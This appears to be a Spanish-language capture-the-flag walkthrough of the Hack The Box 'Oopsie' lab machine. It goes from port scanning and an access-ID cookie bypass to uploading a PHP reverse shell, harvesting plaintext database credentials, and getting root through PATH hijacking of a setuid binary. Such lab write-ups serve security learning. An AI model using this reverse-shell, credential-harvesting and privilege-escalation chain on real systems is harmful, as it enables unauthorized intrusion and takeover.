HACK THE BOX - OOPSIE MACHINE

- sudo nmap -sC -sV -sS 10.129.54.45																									    -Escaneo de puertos, encontramos puerto 22 y 80 con un servidor Apache con Ubuntu

            -Nos conectamos al servidor Apache desde Firefox http://10.129.95.191, verificamos la página y buscamos alguna subdirectorio en el que podamos loguearnos, para ello utilizaremos burpsuite
            -Burpsuite es una herramienta diseñada para hacer pentesting de aplicaciones web. Burpsuite nos da utilidades como: Proxy web, Spider, Escaner de seguridad, intruder, Repeater, Automation.
            -Para su uso, modificamos las Settings de Proxy en Firefox y colocamos "Manual Proxy Configuration" y configuracion HTTP Proxy: 127.0.0.1 y en Port: 8080, ademas activamos la opción "Also use the proxy for HTTPS"
            -Una vez modificado, abrimos Burpsuite, nos colocamos en la pestaña "Proxy" y colocamos Intercept en off, posterior nos dirigimos a target y recargamos la página, de modo tal que podemos visualizar en burpuiste el trafico interceptado con todas las peticiones realizadas, de donde podemos encontrar una subdirectorio con el nombre http://10.129.54.45/cdn-cgi/login/ 
            -Nos conectamos a http://10.129.54.45/cdn-cgi/login/ y podemos ver que existe la posibilidad de ingresar en modo "Guest", y es a partir de donde tratamos de encontrar alguna vulnerabilidad
            -Con Wappalyzer verificamos que la web está escrita en PHP, para lo cual navegando por las pestañas encontramos una de "Uploads", para ello trataremos de realizar un "Reverse Shell Connection", pero primeramente necesitamos tener acceso a la pestaña Upload, que en el caso de Guests, no es posible
            -En la pestaña Account, como guest tenemos un numero Access ID "2233", y si lo modificamos en la URL por un "1", encontraremos que nos carga el AccesID=34322 y Client=Admin, lo cual podemos tratar de explotar en la pagina pestaña de uploads a traves de las Coockies "Storage" del sitio.
            -Nos vamos a la pestaña "Uploads" y modificamos las coockies - Storage, con la opcion "Inspeccionar en firefox", reemplazamos por las credenciales de Admin encontradas anteriormente y recargamos la pagina, ganando acceso y pudiendo cargar archivos.

- locate php-reverse-shell.php                                                                                                              -Encontramos el archivo en la ruta  "/usr/share/webshells/php/php-reverse-shell.php"
- cd ~/Hacking/HackTheBox/Oopsie                                                                                                            -Nos movemos al directorio de trabajo de la maquina
- cp /usr/share/webshells/php/php-reverse-shell.php ./                                                                                      -Copiamos el archivo desde su directorio al directorio de trabajo
- sudo vi php-reverse-shell.php                                                                                                             -Modificamos el archivo para poder usar el reverse shell
- ifconfig                                                                                                                                  -Verificamos cual es nuestra IP tun0 

            -Modificamos la IP (Colocamos la IP de tun0) y modificamos la opcion Port (Colocamos el puerto a traves del cual se establecerá el RSC)
            -Una vez modificadas los dos parámetros en el archivo .php, procedemos a subirlo a la web.
            -Ya hemos subido el archivo, pero necesitamos poder ejecutarlo para establecer la RSC, para ello trataremos de encontrar el subdirectorio en el que se encuentre alojado nuestro archivo cargado, para ello hacemos uso de gobuster y hacemos una enumeración de subdirectorios.

- gobuster dir --url http://10.129.54.45 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html                         -Uso de gobuster para enumeración de subdirectorios, con el cual encontramos "http://10.129.54.45/uploads", y tratamos de acceder al directorio, pero no tenemos autorización asi que probamos unicamente ejecutando el archivo desde la url. 

            -Antes de ejecutar el archivo desde la URL, procedemos a establecer un netcat listene a traves del puerto configurado pra poder establecer la RSC una vez ejecutado el archivo .php

- nc -lvnp 4444                                                                                                                             -Establecemos el Listener en el puerto 4444

            -Colocamos la URL http://10.129.54.45/uploads/php-reverse-shell.php, y ejecutamos, de modo que el reverse shell se establecerá en nuestro terminal de comandos. (Si no se establece a la primera, regresar a la pagina uploads, cargar nuevamente el archivo y posterior usar la url para la conexion)

- python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                                            -Al ejecutar este comando, se abrirá una nueva shell interactiva de Bash que permitirá al usuario interactuar con el sistema operativo y ejecutar comandos de Bash. Esto puede ser útil en situaciones donde se necesita interactuar directamente con la shell para realizar tareas específicas o explorar el sistema en mayor profundidad.

            -Como la web utiliza PHP y SQl, revisando los directorios nos encontramos con la siguiente ruta /var/www/html/cdn-cgi/login, en la cual encontramos 4 archivos (admin.php  db.php  index.php  script.js)

- cat * | grep -i passw*                                                                                                                    -Comando que hace una busqueda a traves de todos los archivos que contengan la palabra "passw..." y muestra la linea en la que se encuentran

            -De ahi encontramos las credenciales (["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!"), asi que verificaremos con que usuarios podemos usar las credenciales encontradas

- cat /etc/password                                                                                                                         -Listamos los usuarios presentes en el sistema, y encontramos a "robert:x:1000:1000:robert:/home/robert:/bin/bash"
- su robert                                                                                                                                 -Intentamos a acceder al usuario mediante el comando su y el pass anteriormente encontrado, pero nos remite que la pass es incorrecta asi que seguimos buscando 
- cat db.php                                                                                                                                -En el archivo, encontramos la credencial "conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');"
- su robert                                                                                                                                 -Intentamos acceder con la segunda pass obtenida "M3g4C0rpUs3r!" y lo logramos.
- sudo -l                                                                                                                                   -Ejecutamos el comando para listar los privilegios del usuario actual, pero al ingresar la credencial, no es posible asi que, seguimos buscando información.
- id                                                                                                                                        -Al ejecutar nos mostrará la información de identificación del usuario actual. User ID - Group ID - Grupos secundarios, etc.

            -De donde encontramos que robert pertenece a un grupo segundario "Bugtracker" [uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)]
            -Bugtracker es una herramienta que permite a los equipos de desarrollo y control de calidad registrar, organizar y solucionar problemas o errores durante el ciclo de vida del desarrollo de software,"robert" tiene acceso o está asignado al grupo "bugtracker" (con GID 1001), lo que puede darnos acceso.

- ls -l /usr/bin/bugtracker && file /usr/bin/bugtracker                                                                                     -Comando que nos permite listar los permisos del programa bugtracker y file  determina el tipo de archivo, indicando que es un archivo de texto ejecutable en formato ASCII.

            -De la salida podemos ver "-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker" en la la "s" indica que se ha establecido el bit setuid (set-user-ID). El bit setuid indica que cuando se ejecute este archivo, se ejecutará con los privilegios del propietario del archivo, que en este caso es root.Esto permite que el archivo pueda realizar ciertas operaciones o acceder a recursos que normalmente solo estarían disponibles para el propietario o el superusuario.

- /usr/bin/bugtracker                                                                                                                       -Ejecutamos la aplicacion para observar el comportamiento

            -le damos algunos valores, y verificamos que nos da como salida "cat: /root/reports/12, donde 12 es la entrada que le digmos a bug tracker, con lo anterior verificamos que se ejecuta cat pero no nos da una ruta especifica desde donde se ejecute, asi que podremos vulnerar esto para ejecutar bash de la siguiente manera

- cd tmp                                                                                                                                    -Nos dirigimos al directorio tmp   
- echo "/bin/bash" > cat                                                                                                                    -Generamos un archivo con el nombre cat y el contenido puesto en la linea
- chmod +x cat                                                                                                                              -Le damos permisos de ejecucion al archivo cat
- export PATH=/tmp:$PATH                                                                                                                    -Para poder ejecutar agregamos el directorio /tmp a la ruta PATH
- echo PATH                                                                                                                                 -Verificamos que /tmp se encuentre en los ejecutables de PATH
- /usr/bin/bugtracker                                                                                                                       -Por ultimo ejecutamos el programa y se ejecutara un bash con los permisos de root
- su root                                                                                                                                   -Accedemos al usuario root con todos los privilegios y captamos nuestras flags.
- locate root.txt
- locate user.txt                                                                                                                                   

            -Ambos archivos de texto contiene nuestros FLAGS.
            
